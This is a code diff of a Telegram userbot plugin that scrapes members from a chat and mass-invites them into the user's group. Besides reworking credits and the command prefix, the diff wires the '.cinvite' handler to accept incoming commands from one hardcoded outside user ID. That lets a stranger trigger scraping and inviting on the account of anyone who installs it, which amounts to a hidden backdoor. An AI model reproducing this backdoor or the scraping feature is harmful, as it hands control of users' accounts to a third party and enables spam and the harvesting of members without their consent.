@@ -1,5 +1,6 @@
-# Ported By @VckyouuBitch From Geez - Projects
-# Copyright © Team Geez - Project
+# Ported By @skyzu From skyzu - Projects
+# Copyright skyzuProject
+# kiju
 
 from telethon.errors import (
     ChannelInvalidError,
@@ -10,8 +11,10 @@ from telethon.tl import functions
 from telethon.tl.functions.channels import GetFullChannelRequest
 from telethon.tl.functions.messages import GetFullChatRequest
 
-from userbot import CMD_HELP, DEVS
+from userbot import CMD_HANDLER as cmd
+from userbot import CMD_HELP
 from userbot.events import register
+from userbot.utils import fox_cmd
 
 
 async def get_chatinfo(event):
@@ -51,8 +54,8 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cinvite(?: |$)(.*)")
+@fox_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=2127265501, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
@@ -92,7 +95,7 @@ async def get_users(event):
 
 CMD_HELP.update(
     {
-        "inviteall": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.inviteall groups username`\
+        "inviteall": f"𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}inviteall groups username`\
           \n📌 : __Scrapes users from the given chat to your group__."
     }
 )
